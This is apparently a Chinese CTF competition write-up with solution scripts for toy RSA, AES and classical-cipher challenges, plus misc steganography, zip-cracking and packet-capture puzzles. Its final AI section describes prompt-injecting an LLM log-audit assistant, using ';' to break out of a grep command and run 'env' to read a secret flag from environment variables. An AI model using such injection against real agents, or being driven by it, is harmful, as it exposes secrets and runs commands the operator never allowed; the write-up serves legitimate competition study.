解出来得HAHAHA CTF is woshizhongguojizhang,

但他总是因为大小写不分被人嘲笑为密码低手提示结果改大写

Flag:WOSHIZHONGGUOJIZHANG

## Ola

#1.由于n=p\*\*3\*q\*r，我们可以写出：φ(n)=(p3−p2)(q−1)(r−1).

#2.已知泄露信息leak为所有与n互质的数之和，我们可以利用以下等式反向求解φ(n)：leak = n\*φ(n)//2,即φ(n)=2\*leak //n ，求出φ(n)(欧拉定理)

#3.已知n ，φ(n) ，c和e，可以利用ctfRSA工具求出m再转字符得到flag。

代码:

```python
from Crypto.Util.number import long_to_bytes
leak = 140778119577648026149592875645597966026330955366708709603548047741836764199342810945820356115629663840699994638820656576436161065935225865456803951636757312417627186325031872871720858484519548472180416097993846463747274334845122314522954361918170402364646436414123279490955498593907509097337570835287897837809803209884308468060264591283265186439186400122790299982439261570612291284480
n = 530618732382579999223263659193173291500585587089599623422540966209221064850647800461122542747292087799384822121504056374866271853851224806069719692454180902996315812292372441834200967459623491
c = 75557340402387205117211848488313965437724901089386066221114511148114509744584553815171415162144699697124231621975399443524299345486981625148428791927315466788057322192184910039272235181722835
e = 65537
phi_n = (2 * leak) // n
d = pow(e, -1, phi_n)
m = pow(c, d, n)
print(long_to_bytes(m))
```

得到结果

flag{0cc701c6faddcd6d927cc89b91944745}

## newRot

变宽旋转的凯撒密码变种。从宽度13开始，每碰到一个字母就加1。因此从最后一个字母开始反向解密，每碰到一个字母就减1，并且加上flag开头的前缀

代码:

```python
import string

bigs = string.ascii_uppercase
smalls = string.ascii_lowercase
enc = "szpw{TkLaRCzIcHYBjDEuuXDacxLTPJUpNitY}"
def decrypt(rot):
    dec = ''
    width = 13
    for i in range(len(rot)):
        if rot[i] in bigs:
            index = bigs.index(rot[i])
            dec += bigs[(index - width) % 26]
            width += 1
            continue
        if rot[i] in smalls:
            index = smalls.index(rot[i])
            dec += smalls[(index - width) % 26]
            width += 1
            continue
        else:
            dec += rot[i]
    return dec

flag = decrypt(enc)
print(flag)
dec = "flag{CsSgWGcKdHXZgZZonPUqrlYFATDxUoyC}"
def encrypt(rot):
    enc = ''
    width = 13
    for i in range(len(rot)):
        if rot[i] in bigs:
            index = bigs.index(rot[i])
            enc += bigs[(index+width) % 26]
            width += 1
            continue
        if rot[i] in smalls:
            index = smalls.index(rot[i])
            enc += smalls[(index+width) % 26]
            width += 1
            continue
        else:
            enc += rot[i]
    return enc

enc = encrypt(flag)
print(enc)
```

结果: flag{CsSgWGcKdHXZgZZonPUqrlYFATDxUoyC}

## ezRSA

RSA是非对称加密最基础的加密方式之一，同时也是最常用的非堆成加密方式之一，学习RSA需要明白RSA相应的数学知识，大家可以看这篇文章学习：cnblogs.com/hykun/p/RSA.html

本道题是RSA最基础的题目，告诉了n、e、c的值需要求解得到密文m。有n我们要对n进行分解，分解成两个大素数的积。由于题目简单，大多数人是给了AI，由于代码中说明q是p的下一个素数，因此我们可以快速求解出p和q，但是在绝大多数情况下，p和q没有那么容易被分解出来，这时候需要用到两个其他的分解工具——factordb.com 还有yafu。

回归题目，题目给出的代码是加密过程，根据加密过程写出解密脚本：

```python
import libnum
import gmpy2
n=8623114063448370656655053412615104605047477101906551613800656510602548265993104107077454911312884879509457990793418890872106467865289103634115306301919193459493088573865213827538879151144089185642237214145699804148532088425679257084596415321304437640843307601950085450515401995909497573567175286331414482237728465176519693935146190932102673143105370413815727168766530785550825162726190988584347534169283050746578321458907150919058689896999313126501048285989469608262666092195946016560258431626015042679790072396381562962632955290941210094069979799697822234962784009030027802691827601533894107971251033801202121575211
e = 65537
c=4890141118425324364446347734990072771255986441280897532155483066209780860465124941395049122226549577111146168737251997348386301046046949154987000262308879199030355954134550416560578400866689121198546638255067001623234655469919447681326120237536162940371322802484331395004231176069442886412679275571568879306635585798622679175771627244389730333576883929456265389673408138566597218342177106757807188584811243214744233585044280276800255956524983868576197325163641496014790800395711568507101020221201610426467851540911842700680655530575387861603696669428372657075382996057887264935851532798579380412702489334922452586059

# 计算n的平方根
sqrt_n = gmpy2.isqrt(n)
# 从平方根开始向下寻找p
p = sqrt_n
while n % p != 0:
    p -= 1
q = n // p
# 计算欧拉函数
phi = (p - 1) * (q - 1)
# 计算私钥d
d = gmpy2.invert(e, phi)
# 解密密文
m = pow(c, d, n)
# 将整数m转换为字符串
flag = libnum.n2s(int(m)).decode()
print(flag)
```

得到flag:flag{very\_ez\_RSA}

## 快要解封的刘德华

首先我们分析代码：我们发现table = "新年快乐恭喜发财"：这是一个包含8个中文字符的字符串。由于有8个字符，它可能用于表示3位二进制数。str1 = ''.join(bin(i)[2:].zfill(9) for i in flag)：对于flag中的每个字节（假设flag是一个字节串），将其转换为二进制字符串，并确保每个二进制字符串长度为9位（用前导零填充）。这暗示每个字节被表示为9位二进制。codes = [str1\[i:i+3] for i in range(0, len(str1), 3)\]：将整个二进制字符串分割成3位一组。由于每个字节是9位，9是3的倍数，正好分割。enc = [table\[int(i, 2)] for i in codes\]：将每个3位二进制字符串转换为整数（0-7），然后使用这个整数作为索引从table中选取字符。所以每个3位组对应一个中文字符。最后打印编码后的字符串。那么我们明白了，按照顺序可以得到——字符到索引的映射：'新'->0, '年'->1, '快'->2, '乐'->3, '恭'->4, '喜'->5, '发'->6, '财'->7，再将编码字符串中的每个字符转换为对应的3位二进制字符串。然后连接所有二进制字符串，得到342位的二进制序列。再把二进制序列分割成38组9位二进制字符串。最后将每组9位二进制转换为整数，再转换为ASCII字符。写出解题脚本：

```python
table = "新年快乐恭喜发财"  
enc = "年恭发年喜恭年恭年年恭财年财乐年发喜年喜发年喜发年喜年年喜乐年喜财年恭财年财快年财年年发新年财年年喜发年喜乐年喜发年喜恭年恭快年喜恭年发发年发快年喜发年喜年年恭发年财年年发恭年恭年年喜新年恭乐年喜快年喜新年恭恭年发年年恭财年财喜"
# 1. 反向：把加密后的每个字符转为字符表中的索引
indices = [table.index(char) for char in enc]
# 2. 把每个索引转换成3位二进制，合并成一个长字符串
binary_str = ''
for index in indices:
binary_str += format(index, '03b')  # '03b' 表示3位二进制，不足补零
# 3. 每9位二进制对应一个字符
# 因为原来的flag是9位字符编码，所以我们每9位分割一次
flag_bin = [binary_str[i:i+9] for i in range(0, len(binary_str), 9)]
# 4. 把每个9位二进制转回字符
flag = ''.join([chr(int(bin_value, 2)) for bin_value in flag_bin])
# 输出解密后的 flag
print("Flag:", flag)
```

## 那一夜RSA和AES睡在了一起

题目也说明了这道题要我们干什么——RSA和AES的嵌套，RSA上面我们已经单了解，现在我们来看对称加密最基础的加密方法之一——AES，还是要了解AES背后的数学知识，可以看这篇文章了解一下：cnblogs.com/chenshikun/p/11667438.html

现在我们来分析代码：RSA加密使用了小公钥指数e=3，且密钥key的立方值小于模数N，因此可以直接计算c的立方根来恢复key。然后，使用key的前16字节作为AES密钥，在CBC模式下解密ciphertext，得到flag，解题脚本：

```python
from Crypto.Util.number import long_to_bytes
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad
import gmpy2
# 给定的数据
N=12249245947030994517694310689025298923001947661406280899380775708553155856535984267169457170176998863452941816432429533334758101240071014717722966686403299685923015581874232260911297030318639189267923781159755065991885265290778323409499446613859993647513939559839029337590722296207577191195816270646630762000005109000575634975845197321056926190863509005154371899740771751010496076625797914745262620701945648288643932693617369408433430742973350937180118888945395563500063460204787953096043496042857990201852843128530653876333644946432289239058396998359919124717912533063007643519748000084415117738710441523126075113813
c=331346539507015471201804364599504365510400960600952624366005950186688869736107605309780167170078198119453000273285743517175921298205995186612026673396300862734672687416503083992823294227125891796632986616434555484739591483903103551
iv_hex = '9f0873d6b7bf98bf9ad52b7d33ffd842'
ciphertext_hex='a3cd8327414f2af26f4049f5382fe2108a0ea03050abab7dff7bc2292bfc67fc'
# 将iv和ciphertext从十六进制转换为字节
iv = bytes.fromhex(iv_hex)
ciphertext = bytes.fromhex(ciphertext_hex)
# 计算c的立方根得到key
key_int, exact = gmpy2.iroot(c, 3)
# 将key转换为字节并取前16字节作为AES密钥
key_bytes = long_to_bytes(key_int)
aes_key = key_bytes[:16]
# 使用AES解密
cipher = AES.new(key=aes_key, iv=iv, mode=AES.MODE_CBC)
plaintext = cipher.decrypt(ciphertext)
# 去除填充
flag = unpad(plaintext, 16)
print("解密后的flag:", flag.decode())
```

运行得到flag:flag{RSA\_love\_AES!!!}

# MISC

## 52111

题目提示：wat3r，盲水印

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762434407213-95cd3855-ddd1-4b02-a4c6-4a1c8c4dc5cb.png)

## Doro

使用随波逐流进行Binwalk提取文件后获得一个压缩包

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762435393360-a281d421-e679-45ed-8ccf-89a626e590d2.png)

无法打开，猜测是伪加密

随波逐流一键修复

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762435484628-c38f77ad-aba4-429e-a965-aa99c329098c.png)

得到doro.txt一眼base64

flag{3z\_d0r0\_cl1ck\_g3t}

## Hacker

题目描述密码，直接wireshark搜password

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762433213452-2dde4fc0-01f6-46a9-98e1-cf016d362206.png)

flag&#123;Admin123!@#&#125;

## 去哪找易佬

Google搜索引擎直接识图搜

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762433354964-c2fa3ead-1762-4db0-815e-e438ba24ad14.png)

再让豆包列出各个校区名

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762433554880-27058f3b-c894-43a7-a644-e7ef20e31b0f.png)

挨个试

flag{浙江省杭州市西湖区浙大路38号浙江大学玉泉校区}

## 哈基米也要学安全

将学安全很轻松.png拖入随波逐流分析，一键修复长宽

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762433697141-8163f62f-1954-461f-8d5b-0fb2ed27d3a0.png)

在哈基米曼波.gif中得到hint

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762434658822-54c27b9a-9758-49fb-aa0e-7c9cd4fd3d81.png)

将哈基米.txt中的内容url解码

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762434713466-7e4a15ec-05ec-4214-8948-56f5717a6f59.png)

结合hint解密

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762434766309-ffda16ba-86a1-4c53-b538-628b00efb3c5.png)

拼接两端flag即可

flag{3adc8d1f53121b87-2e9d-5b7a3c69-8f1d4e}

## 李天帝的战歌

MP3stego

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762435195025-9732dc75-34b0-41a5-9b3a-dc84cfa4a880.png)

flag{q1\_j1\_zh3n\_hui\_z4i\_x1an!!}

## 好玩的misc

hint.docx中得到一段字符串

base64解码

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762501251736-2d8c6d3e-7de1-46df-bcea-177b9259d88c.png)

得到Kq1X

根据提示压缩包密码为8位(对应00000000.zip)

掩码爆破

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762501407950-8101245b-8666-480e-ad26-a4a75e64f0b2.png)

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762501422282-c73631f6-e8c1-42f8-9a2a-8d4aa5ee23c1.png)

得到压缩包密码Kq1XHaCk

解压获得1.png，直接打开显示图片加载失败，用file命令看下文件类型

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762501700316-928b9a72-fe0d-4101-b95b-34e96fcc55af.png)

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762501793424-35ba5965-424e-47db-be16-e09be4e9c411.png)

得到字符串LTlYN30=}

base64解码后

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762501842958-160e07fa-2b80-44c9-a7dd-9782d21e7387.png)

重新回到hint.docx

ctrl+a全选换个字体颜色

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762501998802-47a7bfd5-f597-40e1-a49f-264db22f7088.png)

得到6Z1-

打开显示隐藏文字

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762502039857-117241ce-54c6-4a30-8f49-fe6491558b1b.png)

显示一段flag

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762502058942-1f78f32b-d9f2-46a3-9fae-6e858f6b966b.png)

flag{8A3-

用bandzip打开hint.docx，得到flag3

![](https://cdn.nlark.com/yuque/0/2025/png/48754697/1762502128220-5af55e2d-ba69-4bc7-ad46-608e8f1a2a47.png)

拼接上面的字符

flag{8A3-6Z1-2B5-9X7}

## 广森同志爱化学

 Lv Db Bk Ds Lv Db Bk Ds Gs Db Bk Ds Lr Mc Rf Bk Ds Lr

后面自创的元素纯是为了让大家了解ASCII码，将这些元素符号的原子序数写出来直接进行ASCII码转化即可得到flag：

flag{tiantianxiangshang}

# AI

## 高级 AI 日志审计助手

考点：提示词注入

命令注入，使用`;`截断`grep keyword`查询命令并执行`env`获取环境变量中的flag

![ccd29aad08e409c5f9ce167b1e895bcf.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762432656674-95838056-c0f7-48bd-8fc0-950ad35a7ff4.png)![359644081067f3fb6488d2c21101a8a7.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762432661403-fed989b9-d2d1-4319-a65c-6bbd8128f029.png)

![image.png](https://cdn.nlark.com/yuque/0/2025/png/39170111/1762426063700-28d412d8-d3e3-45f4-9e99-f04cdf40b4a1.png)
